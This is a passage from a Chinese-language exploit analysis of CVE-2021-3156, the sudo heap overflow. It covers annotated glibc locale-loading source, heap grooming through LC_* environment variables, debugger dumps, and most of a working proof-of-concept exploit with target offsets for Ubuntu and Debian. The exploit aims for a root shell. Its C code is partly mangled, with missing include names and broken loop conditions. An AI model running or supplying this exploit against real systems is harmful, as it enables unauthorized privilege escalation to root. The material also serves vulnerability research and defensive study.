            break;
          }
          last = retval;
        }
    // 如果文件在l10nfile_list列表中，即之前已经查看过了，那么这里就直接释放abs_filename即之前申请的堆块。
      if (retval != NULL || do_allocate == 0)
      {
        free (abs_filename);// 这里会释放开头申请的堆块
        return retval;
      }
    //...
      // 这里通过改变mask（组合territory,codeset等通过mask控制的参数），穷举路径搜索配置文件
      cnt = __argz_count (dirlist, dirlist_len) == 1 ? mask - 1 : mask;
      for (; cnt >= 0; --cnt)
        if ((cnt & ~mask) == 0)
        {
          /* Iterate over all elements of the DIRLIST.  */
          char *dir = NULL;
          while ((dir = __argz_next ((char *) dirlist, dirlist_len, dir))
                 != NULL)
            retval->successor[entries++]
            = _nl_make_l10nflist (l10nfile_list, dir, strlen (dir) + 1, cnt,
                                  language, territory, codeset,
                                  normalized_codeset, modifier, filename, 1);
        }
      //...
      return retval;
    }
从上面的源码来看`setlocale`函数，如果传入的参数是`NULL`，那么就会返回`_nl_global_locale.__names`数组中对应的值即相应的`LC_*`的值。如果传入的参数是`“”`，那么就会根据环境变量设置`_nl_global_locale.__names`中的值，函数最主要的是进入了一个`while`循环，每次调用`_nl_find_locale`函数首先从环境变量中按照优先级顺序加载相应的环境变量，然后根据环境变量从`/usr/lib/locale`中查找有没有对应的文件，这里会根据`mask`的值控制加载的优先级，加载文件，如果没有对应的文件就会返回`NULL`。
> 这里比如LC_COLLATE=C.UTF-8[@aaaa](https://github.com/aaaa
> "@aaaa")，如果/usr/lib/locale/C.UTF-8[@aaaa](https://github.com/aaaa
> "@aaaa")/LC_COLLATE文件存在的话，那么就加载这个文件，否则就加载/usr/lib/locale/C.UTF-8/LC_COLLATE文件，当然这里有很多的路径选择，不止这两个。
当`_nl_find_locale`函数返回的为`NULL`的时候，`while`循环就会终止，此时`category>0`，那么这里就表明加载环境变量出现了错误，会释放之前申请的所有的`newnames`，也就是环境变量中的值比如`C.UTF-8[@aaaa](https://github.com/aaaa
"@aaaa")`。
否则当`while`循环执行完毕之后就会将所有的`_nl_global_locale.__names`数组中对应的值设置为我们输入的值，然后将`LC_ALL`赋值
那么这里的`free`原语就出来了，假如我们想要设置`n`个`size`大小的堆块，那么就设置`n`个环境变量（这里注意顺序，环境变量从后向前开始加载），环境变量的值为`C.UTF-8[@len](https://github.com/len
"@len")`，其中`len`的大小满足`> size-0x20 &  heapinfo
    (0x20)     fastbin[0]: 0x0
    (0x30)     fastbin[1]: 0x0
    (0x40)     fastbin[2]: 0x0
    (0x50)     fastbin[3]: 0x0
    (0x60)     fastbin[4]: 0x0
    (0x70)     fastbin[5]: 0x0
    (0x80)     fastbin[6]: 0x0
    (0x90)     fastbin[7]: 0x0
    (0xa0)     fastbin[8]: 0x0
    (0xb0)     fastbin[9]: 0x0
                      top: 0x555555582580 (size : 0x1da80)
           last_remainder: 0x5555555814b0 (size : 0xf90)
                unsortbin: 0x5555555814b0 (size : 0xf90)
    (0x20)   tcache_entry[0](1): 0x5555555814a0
    (0x40)   tcache_entry[2](3): 0x55555557ff40 --> 0x555555580620 --> 0x555555581380// group files
    (0x70)   tcache_entry[5](1): 0x555555580cb0 // 环境变量释放产生的0x70堆块
    (0x80)   tcache_entry[6](1): 0x555555580a90 // user_args堆块，是附加堆块
    (0x1e0)   tcache_entry[28](1): 0x55555557f2a0
    (0x410)   tcache_entry[63](1): 0x55555557f500
这里由于`ubuntu 20.04`下面我在调试的时候`execve`执行之后`sudo
main`函数执行之前就会有一个`0x80`的堆块，不知道什么原因，因此这里直接释放`0x80`的堆块会有问题，因此这里我是用附加堆块来实现`0x80`大小的堆块的效果。
拿到上述的堆布局之后就可以将`user_args`长度设置为`0x80`，申请得到`0x555555580a90`堆块，之后就可以覆写`0x555555581380`的`group
files service_user`结构体了。
这里我们看到堆块之间的差值是`0x8f0`，我们需要覆写这些长度。中间这些堆块都是在进行`setlocale`中产生的，对之后的程序进行没有影响，可以直接覆写。根据之前溢出的规则，遇到`\\`就会继续向后读。目前`exp`中参数设置如下
    "sudoedit", "-s", smash_a, "\\", smash_b, NULL, envp
参数和环境变量在内存中的表现方式如下
    // argv->0x7ffc304d1a18
    pwndbg> telescope 0x7ffc304d1a18
    00:0000│ rdx  0x7ffc304d1a18 —▸ 0x7ffc304d1df6 ◂— 'sudoedit'
    01:0008│      0x7ffc304d1a20 —▸ 0x7ffc304d1dff ◂— 0x414141414100732d /* '-s' */
    02:0010│      0x7ffc304d1a28 —▸ 0x7ffc304d1e02 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\'
    03:0018│      0x7ffc304d1a30 —▸ 0x7ffc304d1e3c ◂— 0x424242424242005c /* '\\' */
    04:0020│      0x7ffc304d1a38 —▸ 0x7ffc304d1e3e ◂— 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\\'
    05:0028│      0x7ffc304d1a40 ◂— 0x0
    06:0030│      0x7ffc304d1a48 —▸ 0x7ffc304d1e76 ◂— 0x5c005c005c005c /* '\\' */
    07:0038│      0x7ffc304d1a50 —▸ 0x7ffc304d1e78 ◂— 0x5c005c005c005c /* '\\' */
    //...
    pwndbg>
    40:0200│   0x7ffc304d1c18 —▸ 0x7ffc304d1eea ◂— 0x5c005c005c005c /* '\\' */
    41:0208│   0x7ffc304d1c20 —▸ 0x7ffc304d1eec ◂— 0x5c005c005c005c /* '\\' */
    42:0210│   0x7ffc304d1c28 —▸ 0x7ffc304d1eee ◂— 0x2f58005c005c005c /* '\\' */
    43:0218│   0x7ffc304d1c30 —▸ 0x7ffc304d1ef0 ◂— 0x30502f58005c005c /* '\\' */
    44:0220│   0x7ffc304d1c38 —▸ 0x7ffc304d1ef2 ◂— 0x5f5030502f58005c /* '\\' */
    45:0228│   0x7ffc304d1c40 —▸ 0x7ffc304d1ef4 ◂— 'X/P0P_SH3LLZ_'
    46:0230│   0x7ffc304d1c48 —▸ 0x7ffc304d1f02 ◂— 0x433d4c4c415f434c ('LC_ALL=C')
    47:0238│   0x7ffc304d1c50 ◂— 0x0
需要注意的是栈中每一个参数的结尾依靠的是`\\`。首先第一次复制，遇到`\\`会将`\\, smash_b,
envp`拷贝一遍，然后是第二次复制，参数即为`\\`因此会将`smash_b,envp`拷贝一遍，接着是`smash_b`，由于`smash_b`之后也是`\\`，因此会一直继续拷贝，也就是将`envp`拷贝了一遍。借着就结束拷贝了。也就是说`smash_b,envp`都被拷贝了三遍，`smash_a`被拷贝了一遍。注意到每一次拷贝结束都会在结尾处加`space`即空格（最后一个空格会被覆写为`0`）。在设定`smash_a,smash_b,envp`的长度的时候基本就是`user_args/2`即为`smash_a,smash_b`的值，剩余的值`/3`就是`envp`的长度，不够的话再用`smash_a`的长度进行微调。
当我们覆写完毕`group
service_user`结构体的`name`字段之后，`sudo`会经过一系列的调用直到`nss_load_library`最终打开`getshell`的动态链接库。
关于动态链接库编译有无空格的问题，如果是精准覆写`name`，那么就不需要空格，因为之后会被覆写为`0`，否则就需要空格。
## EXP
    /**
     ** CVE-2021-3156 PoC by blasty 
     ** ===========================================
     **
     ** Exploit for that sudo heap overflow thing everyone is talking about.
     ** This one aims for singleshot. Does not fuck with your system files.
     ** No warranties.
     **
     ** Shout outs to:
     **   Qualys      - for pumping out the awesome bugs
     **   lockedbyte  - for coop hax. (shared tmux gdb sessions ftw)
     **   dsc         - for letting me rack up his electricity bill
     **   my wife     - for all the quality time we had to skip
     **
     **  Enjoy!
     **
     **   -- blasty // 20210130
     **/
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    // 512 environment variables should be enough for everyone
    #define MAX_ENVP 0x1000
    typedef struct {
            char *target_name;
            char *sudoedit_path;
            uint32_t smash_len_a;
            uint32_t smash_len_b;
            uint32_t null_stomp_len;
            uint32_t lc_all_len;
    } target_t;
    char *lc_names[]={
            "LC_COLLATE",
            "LC_CTYPE",
            "LC_MONETARY",
            "LC_NUMERIC",
            "LC_TIME",
            "LC_MESSAGES",
            "LC_PAPER",
            "LC_NAME",
            "LC_ADDRESS",
            "LC_TELEPHONE",
            "LC_MEASUREMENT",
            "LC_IDENTIFICATION"
    };
    target_t targets[] = {
        {
            // Yes, same values as 20.04.1, but also confirmed.
            .target_name    = "Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27",
            .sudoedit_path  = "/usr/bin/sudoedit",
            .smash_len_a    = 58,
            .smash_len_b    = 54,
            .null_stomp_len = 63,
            .lc_all_len     = 0x30
            // .lc_all_len     = 212
        },
        {
            .target_name    = "Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31",
            .sudoedit_path  = "/usr/bin/sudoedit",
            .smash_len_a    = 58,
            .smash_len_b    = 54,
            .null_stomp_len = 63,
            .lc_all_len     = 212
        },
        {
            .target_name    = "Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28",
            .sudoedit_path  = "/usr/bin/sudoedit",
            .smash_len_a    = 64,
            .smash_len_b    = 49,
            .null_stomp_len = 60,
            .lc_all_len     = 214
        }
    };
    void usage(char *prog) {
        printf("  usage: %s \n\n", prog);
        printf("  available targets:\n");
        printf("  ------------------------------------------------------------\n");
        for(int i = 0; i \n\n");
        if (argc != 2) {
            usage(argv[0]);
            return -1;
        }
        int target_idx = atoi(argv[1]);
        if (target_idx = (sizeof(targets) / sizeof(target_t))) {
            fprintf(stderr, "invalid target index\n");
            return -1;
        }
        target_t *target = &targets[ target_idx ];
        printf("using target: '%s'\n", target->target_name);
        char *smash_a = calloc(target->smash_len_a + 2, 1);
        char *smash_b = calloc(target->smash_len_b + 2, 1);
        memset(smash_a, 'A', target->smash_len_a);
        memset(smash_b, 'B', target->smash_len_b);
        smash_a[target->smash_len_a] = '\\';
        smash_b[target->smash_len_b] = '\\';
        char *s_argv[]={
            // "sudoedit", "-s", smash_a, "\\", NULL
            // "sudoedit", "-s", smash_a, NULL
            "sudoedit", "-s", smash_a, "\\", smash_b, NULL
        };
        char *s_envp[MAX_ENVP];
        int envp_pos = 0;
        for(int i = 0; i  (11 - lc_num); i--){
            temp = calloc(lc_len + strlen(lc_names[i]) + 10, 1);
            strcpy(temp, lc_names[i]);
            strcpy(temp + strlen(lc_names[i]), "=C.UTF-8@");
            memset(temp+strlen(lc_names[i]) + 9, 'A'+i, lc_len);
            s_envp[envp_pos++] = temp;
        }
        temp = calloc(0x50 + strlen(lc_names[i]) + 10, 1);
        strcpy(temp, lc_names[i]);
        strcpy(temp + strlen(lc_names[i]), "=C.UTF-8@");
        memset(temp+strlen(lc_names[i]) + 9, 'A'+i, 0x50);
        s_envp[envp_pos++] = temp;
        i -= 1;
        // temp = calloc(0x60 + strlen(lc_names[i]) + 10, 1);
        // strcpy(temp, lc_names[i]);
        // strcpy(temp + strlen(lc_names[i]), "=C.UTF-8@");
        // memset(temp+strlen(lc_names[i]) + 9, 'A'+i, 0x60);
        // s_envp[envp_pos++] = temp;
        //
        // i -= 1;
        temp = calloc(lc_len + strlen(lc_names[i]) + 10, 1);
        strcpy(temp, lc_names[i]);
        strcpy(temp + strlen(lc_names[i]), "=C.UTF-8@");
        memset(temp+strlen(lc_names[i]) + 9, 'A'+i, lc_len);
        s_envp[envp_pos++] = temp;
        i-=1;
        temp = calloc(lc_len + strlen(lc_names[i]) + 10, 1);
        strcpy(temp, lc_names[i]);
        strcpy(temp + strlen(lc_names[i]), "=XXXXXXXX");
        memset(temp+strlen(lc_names[i]) + 9, 'A'+i, lc_len);
        s_envp[envp_pos++] = temp;
        s_envp[envp_pos++] = NULL;
        printf("** pray for your rootshell.. **\n");